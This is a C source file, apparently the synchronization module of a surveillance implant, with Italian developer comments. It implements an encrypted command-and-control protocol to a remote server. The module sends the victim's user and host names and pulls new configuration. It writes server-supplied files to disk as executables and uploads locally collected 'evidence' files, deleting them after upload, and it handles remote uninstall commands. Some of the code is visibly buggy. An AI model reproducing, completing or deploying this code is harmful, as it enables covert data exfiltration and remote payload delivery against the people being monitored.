#define _BSD_SOURCE

#define PROTO_ERR         ((uint32_t)0x00)
#define PROTO_OK          ((uint32_t)0x01)
#define PROTO_NO          ((uint32_t)0x02)
#define PROTO_UNINSTALL   ((uint32_t)0x0a)

#define PROTO_ID              ((uint32_t)0x0f)
#define PROTO_UPGRADE         ((uint32_t)0x16)
#define PROTO_CONF            ((uint32_t)0x07)
#define PROTO_DOWNLOAD        ((uint32_t)0x0c)
#define PROTO_UPLOAD          ((uint32_t)0x0d)
#define PROTO_FILESYSTEM      ((uint32_t)0x19)
#define PROTO_EXEC            ((uint32_t)0x1b)
#define PROTO_EVIDENCE_SIZE   ((uint32_t)0x0b)
#define PROTO_EVIDENCE        ((uint32_t)0x09)
#define PROTO_BYE             ((uint32_t)0x03)

#define BIO_DECRYPT 0
#define BIO_ENCRYPT 1

#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <strings.h>
#include <unistd.h>
#include <openssl/bio.h>
#include <openssl/evp.h>
#include <openssl/sha.h>
#include <openssl/rand.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <dirent.h>

#include "actionmanager.h"
#include "eventmanager.h"
#include "config.h"
#include "params.h"

struct proto_ctx {
   char host[256];
   int port;
   char cookie[256];
   unsigned char key[16];
   unsigned char iv[16];
   uint64_t time;
   struct {
      char upgrade;
      char conf;
      char filesystem;
      char download;
      char upload;
      char exec;
   } availables;
};
typedef struct proto_ctx PROTO_CTX;

int main(int argc, char *argv[]);
int proto_parseheaders(PROTO_CTX *proto_ctx, char *header);
int proto_auth(PROTO_CTX *proto_ctx);
int proto_id(PROTO_CTX *proto_ctx);
int proto_upgrade(PROTO_CTX *proto_ctx);
int proto_conf(PROTO_CTX *proto_ctx);
int proto_download(PROTO_CTX *proto_ctx);
int proto_upload(PROTO_CTX *proto_ctx);
int proto_exec(PROTO_CTX *proto_ctx);
int proto_filesystem(PROTO_CTX *proto_ctx);
int proto_sendevidence(PROTO_CTX *proto_ctx);
int proto_bye(PROTO_CTX *proto_ctx);
int proto_doreq(PROTO_CTX *proto_ctx, uint32_t command, BIO *bio_req, BIO **bio_resp);

int printh(char *s, int l)
{
   int i; for(i = 0; i < l; i++) {
      printf("%02x", (unsigned char)s[i]);
   }
   printf("\n");

   return 0;
}


int am_synchronize(subaction_synchronize_t *s)
{
   PROTO_CTX proto_ctx;
   int ret = 0;

   printf("[RUN] action synchronize\n");

   memset(&proto_ctx, 0x00, sizeof(proto_ctx));
   snprintf(proto_ctx.host, sizeof(proto_ctx.host), "%s", s->host);
   proto_ctx.port = 80;

   do {
      ret = proto_auth(&proto_ctx);
      if(ret == PROTO_NO) {
         ret = -1;
         break;
      } else if(ret == PROTO_UNINSTALL) {
         ret = -2;
         break;
      }

      proto_id(&proto_ctx);
      //if(proto_ctx.availables.upgrade) proto_upgrade(&proto_ctx);
      if(proto_ctx.availables.conf) if(proto_conf(&proto_ctx)) ret = 3;
      //if(proto_ctx.availables.download) proto_download(&proto_ctx);
      if(proto_ctx.availables.upload) proto_upload(&proto_ctx);
      //if(proto_ctx.availables.exec) proto_exec(&proto_ctx);
      //if(proto_ctx.availables.filesystem) proto_filesystem(&proto_ctx);
      proto_sendevidence(&proto_ctx);
   } while(0);

   proto_bye(&proto_ctx);

   return ret;
}

int BIO_write_int(BIO *b, uint32_t i)
{
   return BIO_write(b, (uint32_t *)&i, sizeof(uint32_t));
}

int BIO_write_string(BIO *b, char *s)
{
   int ret;

   ret = BIO_write_int(b, (strlen(s) + 1) * 2);
   while(*s) {
      ret += BIO_write(b, s, 1);
      ret += BIO_write(b, "\0", 1);
      s++;
   }
   ret += BIO_write(b, "\0\0", 2);

   return ret;
}

uint32_t BIO_read_int(BIO *b)
{
   uint32_t ret;

   return (BIO_read(b, &ret, sizeof(ret)) == sizeof(ret)) ? ret : 0;
}

int BIO_read_string(BIO *b, char *s, int size)
{
   uint32_t len;
   uint16_t c;
   int ret = 1;
   char *p;
   
   if(size <= 0) return 0;

   len = BIO_read_int(b) / 2;

   p = s;

   while(len--) {
      if(BIO_read(b, &c, sizeof(c)) != sizeof(c)) {
         ret = 0;
         break;
      }

      if(!ret) continue;

      if((c < 0x0080) && (size > 1)) {
         *p++ = (char)c;
         size--;
      } else if((c < 0x0800) && (size > 2)) {
         *p++ = (char)(0xC0|(c>>6));
         *p++ = (char)(0x80|(c&0x3F));
         size -= 2;
      } else if(size > 3) {
         *p++ = (char)(0xE0|(c>>12));
         *p++ = (char)(0x80|((c>>6)&0x3F));
         *p++ = (char)(0x80|(c&0x3F));
         size -= 3;
      } else {
         ret = 0;
      }
   }

   if(!ret || ((p != s) && *--p)) {
      *s = '\0';
      ret = 0;
   } else {
      ret = strlen(s);
   }

   return ret;
}

int proto_parseheaders(PROTO_CTX *proto_ctx, char *header)
{
   if(!strncasecmp(header, "Set-Cookie: ", strlen("Set-Cookie: "))) {
      strncpy(proto_ctx->cookie, header + strlen("Set-Cookie: "), sizeof(proto_ctx->cookie) - 1);
      proto_ctx->cookie[sizeof(proto_ctx->cookie)] = '\0';
   }

   return 0;
}

int proto_auth(PROTO_CTX *proto_ctx)
{
   unsigned char devicekey[16], serverkey[16];
   unsigned char nonce[16], ending[16];
   unsigned char sha[SHA_DIGEST_LENGTH];
   BIO *bio_connect, *bio_cipher, *bio_mem;
   int i, ret = -1;
   unsigned char respbuf[256], *respptr;
   SHA_CTX sha_ctx;

   RAND_pseudo_bytes(devicekey, sizeof(devicekey));
   RAND_pseudo_bytes(nonce, sizeof(nonce));
   RAND_pseudo_bytes(ending, sizeof(ending));

   i = time(NULL) % 16;
   if(!i) i++;

   SHA1_Init(&sha_ctx);
   SHA1_Update(&sha_ctx, bps.build, 16);
   SHA1_Update(&sha_ctx, bps.instance, 20);
   SHA1_Update(&sha_ctx, bps.subtype, 16);
   SHA1_Update(&sha_ctx, bps.confkey, 16);
   SHA1_Final(sha, &sha_ctx);

   snprintf((char *)respbuf, sizeof(respbuf), "%s:%u", proto_ctx->host, proto_ctx->port);
   bio_connect = BIO_new_connect((char *)respbuf);
   BIO_puts(bio_connect, "POST /wc12/webclient HTTP/1.0\r\n");
   BIO_printf(bio_connect, "Host: %s\r\n", proto_ctx->host);
   BIO_puts(bio_connect, "Content-Type: application/octet-stream\r\n");
   BIO_printf(bio_connect, "Content-Length: %u\r\n", 112 + i);
   BIO_puts(bio_connect, "\r\n");

   bio_cipher = BIO_new(BIO_f_cipher());
   BIO_push(bio_cipher, bio_connect);
   memset(proto_ctx->iv, 0x00, sizeof(proto_ctx->iv));
   BIO_set_cipher(bio_cipher, EVP_get_cipherbyname("aes-128-cbc"), bps.signature, proto_ctx->iv, 1);

   BIO_write(bio_cipher, devicekey, sizeof(devicekey));
   BIO_write(bio_cipher, nonce, sizeof(nonce));
   BIO_write(bio_cipher, bps.build, 16);
   BIO_write(bio_cipher, bps.instance, 20);
   BIO_write(bio_cipher, bps.subtype, 16);
   BIO_write(bio_cipher, sha, sizeof(sha));
   BIO_flush(bio_cipher);

   BIO_pop(bio_cipher);

   BIO_write(bio_connect, ending, i);
   BIO_flush(bio_connect);

   do {
      i = 0;
      while(i < sizeof(respbuf)) {
         BIO_read(bio_connect, respbuf + i, 1);
         if(respbuf[i] == '\n') {
            break;
         }
         i++;
      } 
      if(respbuf[i - 1] == '\r') respbuf[i - 1] = '\0';
      respbuf[i] = '\0';
      proto_parseheaders(proto_ctx, (char *)respbuf);
   } while(respbuf[0]);

   BIO_read(bio_connect, respbuf, 32);
   
   bio_mem = BIO_new(BIO_s_mem());
   BIO_push(bio_cipher, bio_mem);
   memset(proto_ctx->iv, 0x00, sizeof(proto_ctx->iv));
   BIO_set_cipher(bio_cipher, EVP_get_cipherbyname("aes-128-cbc"), bps.signature, proto_ctx->iv, 0);

   BIO_write(bio_cipher, respbuf, 32);
   BIO_flush(bio_cipher);
   BIO_get_mem_data(bio_mem, &respptr);

   memcpy(serverkey, respptr, sizeof(serverkey));

   BIO_pop(bio_cipher);
   BIO_free(bio_mem);
   BIO_free(bio_cipher);

   SHA1_Init(&sha_ctx);
   SHA1_Update(&sha_ctx, bps.confkey, 16);
   SHA1_Update(&sha_ctx, serverkey, sizeof(serverkey));
   SHA1_Update(&sha_ctx, devicekey, sizeof(devicekey));
   SHA1_Final(sha, &sha_ctx);

   memcpy(proto_ctx->key, sha, sizeof(proto_ctx->key));

   BIO_read(bio_connect, respbuf, 32);

   bio_cipher = BIO_new(BIO_f_cipher());
   memset(proto_ctx->iv, 0x00, sizeof(proto_ctx->iv));
   BIO_set_cipher(bio_cipher, EVP_get_cipherbyname("aes-128-cbc"), proto_ctx->key, proto_ctx->iv, 0);
   bio_mem = BIO_new(BIO_s_mem());
   BIO_push(bio_cipher, bio_mem);

   BIO_write(bio_cipher, respbuf, 32);
   BIO_flush(bio_cipher);
   BIO_get_mem_data(bio_mem, &respptr);
 
   for(i = 0; i < sizeof(nonce); i++) {
      if(nonce[i] != respptr[i]) break;
   }
   if(i < sizeof(nonce));

   memcpy(&ret, respptr + 16, sizeof(ret));

   BIO_free_all(bio_cipher);
   BIO_free_all(bio_connect);

   return ret;
}

int proto_id(PROTO_CTX *proto_ctx)
{
   BIO *bio_req = NULL, *bio_resp = NULL;
   int ret, num, i;
   char *ptr;

   bio_req = BIO_new(BIO_s_mem());

   BIO_write_int(bio_req, bps.version);
   BIO_write_string(bio_req, user);
   BIO_write_string(bio_req, host);
   BIO_write_string(bio_req, "");

   ret = proto_doreq(proto_ctx, PROTO_ID, bio_req, &bio_resp);

   ret = BIO_get_mem_data(bio_resp, &ptr);

   proto_ctx->time = *((uint64_t *)ptr);
   ptr += sizeof(proto_ctx->time);
   num = *((int *)ptr);
   ptr += sizeof(num);

   for(i = 0; i < num; i++) {
      switch(*(((uint32_t *)ptr) + i)) {
         case PROTO_UPGRADE:
            proto_ctx->availables.upgrade = 1;
            break;
         case PROTO_CONF:
            proto_ctx->availables.conf = 1;
            break;
         case PROTO_DOWNLOAD:
            proto_ctx->availables.download = 1;
            break;
         case PROTO_UPLOAD:
            proto_ctx->availables.upload = 1;
            break;
         case PROTO_EXEC:
            proto_ctx->availables.exec = 1;
            break;
         case PROTO_FILESYSTEM:
            proto_ctx->availables.filesystem = 1;
            break;
      }
   }

   BIO_free(bio_req);
   BIO_free(bio_resp);

   return 0;
}

int proto_upgrade(PROTO_CTX *proto_ctx)
{
   BIO *bio_resp = NULL;
   int ret;
   char *ptr;

   ret = proto_doreq(proto_ctx, PROTO_UPGRADE, NULL, &bio_resp);

   printf("PROTO_UPGRADE: %d - ", ret);
   ret = BIO_get_mem_data(bio_resp, &ptr);
   /*printh(ptr, ret);*/

   BIO_free(bio_resp);

   return 0;
}

int proto_conf(PROTO_CTX *proto_ctx)
{
   BIO *bio_req = NULL, *bio_resp = NULL, *bio_file = NULL;
   char *ptr;
   int ret;

   printf("CONF\n");
   if(proto_doreq(proto_ctx, PROTO_CONF, NULL, &bio_resp) == PROTO_NO) return PROTO_NO;

   ret = BIO_get_mem_data(bio_resp, &ptr);

   if(!(bio_file = BIO_new_file("config.new", "w"))) return PROTO_NO;
   BIO_write(bio_file, ptr, ret);
   BIO_free(bio_file);
   BIO_free(bio_resp);

   am_stopqueue(QUEUE_FAST);
   parseconfig("config.new");
   am_startqueue(QUEUE_FAST);
   em_scheduleevents();

   bio_req = BIO_new(BIO_s_mem());

   BIO_write_int(bio_req, PROTO_OK);
   if(proto_doreq(proto_ctx, PROTO_CONF, bio_req, &bio_resp) == PROTO_NO) return PROTO_NO;

   BIO_free(bio_req);

   return 3;
}

int proto_download(PROTO_CTX *proto_ctx)
{
   BIO *bio_resp = NULL;
   uint32_t num;
   char name[512];

   printf("DOWNLOAD\n");
   if(proto_doreq(proto_ctx, PROTO_DOWNLOAD, NULL, &bio_resp) == PROTO_NO) return PROTO_NO;

   num = BIO_read_int(bio_resp);

   while(num--) {
      if(BIO_read_string(bio_resp, name, sizeof(name))) printf("- %s\n", name);
   }

   BIO_free(bio_resp);

   return 0;
}

int proto_upload(PROTO_CTX *proto_ctx)
{
   BIO *bio_resp = NULL, *bio_file = NULL;
   int ret;
   char *ptr;
   uint32_t left;
   char name[512];

   printf("PROTO_UPLOAD\n");

   do {
      if((ret = proto_doreq(proto_ctx, PROTO_UPLOAD, NULL, &bio_resp)) == PROTO_NO) break;

      left = BIO_read_int(bio_resp);
      BIO_read_string(bio_resp, name, sizeof(name));
      ret = BIO_get_mem_data(bio_resp, &ptr);

      printf("upload file %s (%d left)\n", name, left);

      if(!(bio_file = BIO_new_file(name, "w"))) return PROTO_NO;
      BIO_write(bio_file, ptr + sizeof(left), ret - sizeof(left));
      BIO_free(bio_file);
      BIO_free(bio_resp);
      chmod(name, 0755);
   } while(left);

   return 0;
}

int proto_exec(PROTO_CTX *proto_ctx)
{
   BIO *bio_resp = NULL;
   uint32_t num;
   char name[512];

   printf("EXEC\n");
   if(proto_doreq(proto_ctx, PROTO_EXEC, NULL, &bio_resp) == PROTO_NO) return PROTO_NO;

   num = BIO_read_int(bio_resp);

   while(num--) {
      if(BIO_read_string(bio_resp, name, sizeof(name))) printf("exec - %s\n", name);
   }

   BIO_free(bio_resp);

   return 0;
}

int proto_filesystem(PROTO_CTX *proto_ctx)
{
   BIO *bio_resp = NULL;
   uint32_t num, depth;
   char name[512];

   printf("FILESYSTEM\n");
   if(proto_doreq(proto_ctx, PROTO_FILESYSTEM, NULL, &bio_resp) == PROTO_NO) return PROTO_NO;

   num = BIO_read_int(bio_resp);

   while(num--) {
      depth = BIO_read_int(bio_resp);
      if(BIO_read_string(bio_resp, name, sizeof(name))) printf("- %s (depth: %u)\n", name, depth);
   }

   BIO_free(bio_resp);

   return 0;
}

int proto_sendevidence(PROTO_CTX *proto_ctx)
{
   BIO *bio_req = NULL, *bio_resp = NULL;
   char *ptr;
   int ret;
   struct stat s;
   FILE *fp = NULL;
   char buf[1024];
   DIR *d;
   struct dirent *de, *dr;

   /* TODO XXX stabilizza la coda di evidence */

   if((d = opendir(".")) == NULL) return PROTO_NO;
   de = malloc(offsetof(struct dirent, d_name) + pathconf(".", _PC_NAME_MAX) + 1);

   while(!readdir_r(d, de, &dr) && dr) {
      if(stat(de->d_name, &s) == -1) return PROTO_NO;
      if(!(s.st_mode & S_ISVTX)) continue;
      if((fp = fopen(de->d_name, "r")) == NULL) return PROTO_NO;
      printf("evidence -> %s %o\n", de->d_name, s.st_mode);

      bio_req = BIO_new(BIO_s_mem());

      BIO_write_int(bio_req, s.st_size);
      while((ret = fread(buf, 1, sizeof(buf), fp))) {
         BIO_write(bio_req, buf, ret);
      }
      fclose(fp);

      ret = proto_doreq(proto_ctx, PROTO_EVIDENCE, bio_req, &bio_resp);

      if(ret == PROTO_OK) unlink(de->d_name);

      ret = BIO_get_mem_data(bio_resp, &ptr);

      BIO_free(bio_resp);
      BIO_free(bio_req);
   }

   free(de);
   closedir(d);

   return 3;
}

int proto_bye(PROTO_CTX *proto_ctx)
{
   BIO *bio_resp = NULL;

   printf("BYE\n");
   if(proto_doreq(proto_ctx, PROTO_BYE, NULL, &bio_resp) == PROTO_NO) return PROTO_NO;

   BIO_free(bio_resp);

   return 0;
}

/* mancano i controlli d'errore sui valori di ritorno */
/* manca il parsing del cookie */
int proto_doreq(PROTO_CTX *proto_ctx, uint32_t command, BIO *bio_req, BIO **bio_resp)
{
   BIO *bio_connect = NULL, *bio_cipher = NULL, *bio_md = NULL;
   char buf[256], sha[SHA_DIGEST_LENGTH], *ptr = NULL;
   uint32_t len = 0, ret = 0, i;
   unsigned char ending[16];

   if(bio_req) {
      BIO_flush(bio_req);
      len = BIO_get_mem_data(bio_req, &ptr);
   }

   RAND_pseudo_bytes(ending, sizeof(ending));

   i = time(NULL) % 16;
   if(!i) i++;

   bio_connect = BIO_new(BIO_s_connect());
   bio_cipher = BIO_new(BIO_f_cipher());
   bio_md = BIO_new(BIO_f_md());
   BIO_push(bio_cipher, bio_connect);
   BIO_push(bio_md, bio_cipher);

   BIO_set_conn_hostname(bio_connect, proto_ctx->host);
   BIO_set_conn_int_port(bio_connect, &proto_ctx->port);
   BIO_set_cipher(bio_cipher, EVP_get_cipherbyname("aes-128-cbc"), proto_ctx->key, proto_ctx->iv, BIO_ENCRYPT);
   BIO_set_md(bio_md, EVP_sha1());

   BIO_printf(bio_connect, "POST /wc12/webclient HTTP/1.0\r\n");
   BIO_printf(bio_connect, "Host: %s\r\n", proto_ctx->host);
   if(proto_ctx->cookie[0]) BIO_printf(bio_connect, "Cookie: %s\r\n", proto_ctx->cookie);
   BIO_printf(bio_connect, "Content-Type: application/octet-stream\r\n");
   BIO_printf(bio_connect, "Content-Length: %u\r\n", (((sizeof(command) + len + sizeof(sha)) & 0xfffffff0) + 0x10) + i);
   BIO_printf(bio_connect, "\r\n");

   BIO_write_int(bio_md, command);
   if(len) BIO_write(bio_md, ptr, len);
   BIO_gets(bio_md, sha, sizeof(sha));
   BIO_write(bio_cipher, sha, sizeof(sha));
   BIO_flush(bio_md);

   BIO_write(bio_connect, ending, i);
   BIO_flush(bio_connect);

   BIO_set_cipher(bio_cipher, EVP_get_cipherbyname("aes-128-cbc"), proto_ctx->key, proto_ctx->iv, BIO_DECRYPT);
   BIO_set_md(bio_md, EVP_sha1());

   do {
      len = 0;
      while(len < sizeof(buf)) {
         BIO_read(bio_connect, buf + len, 1);
         if(buf[len++] == '\n') break;
      }
      buf[--len] = '\0';
      if(len && (buf[len - 1] == '\r')) buf[len - 1] = '\0';
   } while(buf[0]);
 
   command = BIO_read_int(bio_md);

   if(command == PROTO_OK) {
      len = BIO_read_int(bio_md);
      if(len) *bio_resp = BIO_new(BIO_s_mem());
      while(len) {
         ret = BIO_read(bio_md, buf, (len > sizeof(buf) ? sizeof(buf) : len));
         BIO_write(*bio_resp, buf, ret);
         len -= ret;
      }
   }

   BIO_gets(bio_md, sha, sizeof(sha));
   ret = BIO_read(bio_cipher, buf, (sizeof(buf) > sizeof(sha)) ? sizeof(sha) : sizeof(buf));

   if(memcmp(sha, buf, ret)) command = PROTO_ERR;

   BIO_free_all(bio_md);

   return command;
}
